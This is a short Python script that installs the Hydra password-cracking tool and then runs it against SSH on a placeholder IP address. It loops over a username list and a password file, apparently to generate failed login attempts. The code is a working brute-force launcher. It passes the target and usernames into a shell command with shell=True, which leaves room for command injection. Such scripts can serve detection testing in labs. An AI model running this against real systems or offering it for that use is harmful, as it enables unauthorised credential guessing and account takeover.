import subprocess
import shutil

def is_hydra_installed():
    return shutil.which("hydra") is not None

def install_hydra():
    subprocess.run(["sudo", "apt-get", "install", "hydra"])

if __name__ == "__main__":
    if not is_hydra_installed():
        print("Hydra is not installed. Installing...")
        install_hydra()
        print("Hydra installed successfully.")
    else:
        print("Hydra is already installed.")
def generate_failed_login_attempts(target_ip, username_list, password_list, num_attempts_per_user):
    for username in username_list:
        for _ in range(num_attempts_per_user):
            command = f"hydra -l {username} -P {password_list} ssh://{target_ip}"
            subprocess.run(command, shell=True)

if __name__ == "__main__":
    target_ip = "192.168.1.1"  # Replace with the target IP address
    username_list = ["user1", "user2"]  # Replace with a list of existing usernames
    password_list = "path/to/passwords.txt"  # Replace with the path to a password list
    num_attempts_per_user = 3  # Adjust the number of attempts as needed

    generate_failed_login_attempts(target_ip, username_list, password_list, num_attempts_per_user)
